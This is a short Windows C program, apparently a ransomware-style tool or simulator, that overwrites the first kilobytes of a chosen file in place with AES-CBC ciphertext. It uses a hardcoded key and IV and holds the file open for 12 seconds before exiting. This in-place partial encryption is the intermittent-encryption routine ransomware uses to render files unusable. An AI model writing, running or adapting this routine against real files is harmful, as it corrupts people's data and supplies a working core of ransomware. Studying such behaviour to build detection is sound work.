#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "bcrypt.lib")

static const unsigned char g_key[32] = {
    0xC1, 0xA5, 0x3E, 0x77, 0x90, 0x12, 0x4B, 0xDE,
    0x6F, 0x88, 0x21, 0xAC, 0x55, 0x34, 0xE9, 0x0B,
    0x17, 0x42, 0xFB, 0x9C, 0x68, 0x2D, 0x70, 0xA1,
    0x05, 0xCE, 0x39, 0x84, 0xBB, 0x16, 0x5A, 0xF3
};
static const unsigned char g_iv0[16] = {
    0x10, 0x32, 0x54, 0x76, 0x98, 0xBA, 0xDC, 0xFE,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF
};

int main(int argc, char **argv)
{
    const char *path;
    DWORD headKB, head, fsize, got = 0, put = 0;
    HANDLE h;
    unsigned char *buf, *out, iv[16];
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE key = NULL;
    ULONG outlen = 0;

    if (argc < 2) {
        printf("usage: partial_encryptor <file> [headKB]\n");
        return 1;
    }
    path = argv[1];
    headKB = (argc >= 3) ? (DWORD)atoi(argv[2]) : 8;
    head = headKB * 1024u;

    h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("open fail %lu\n", GetLastError());
        return 2;
    }

    fsize = GetFileSize(h, NULL);
    if (head > fsize)
        head = fsize & ~15u;

    buf = (unsigned char *)malloc(head);
    out = (unsigned char *)malloc(head);
    if (!buf || !out) { CloseHandle(h); return 3; }

    SetFilePointer(h, 0, NULL, FILE_BEGIN);
    ReadFile(h, buf, head, &got, NULL);

    BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(alg, &key, NULL, 0, (PUCHAR)g_key, 32, 0);

    memcpy(iv, g_iv0, 16);
    BCryptEncrypt(key, buf, head, NULL, iv, 16, out, head, &outlen, 0);

    SetFilePointer(h, 0, NULL, FILE_BEGIN);
    WriteFile(h, out, outlen, &put, NULL);
    FlushFileBuffers(h);

    Sleep(12000);

    BCryptDestroyKey(key);
    BCryptCloseAlgorithmProvider(alg, 0);
    CloseHandle(h);
    free(buf);
    free(out);
    printf("partial-encrypted head %lu of %lu bytes: %s\n", outlen, fsize, path);
    return 0;
}
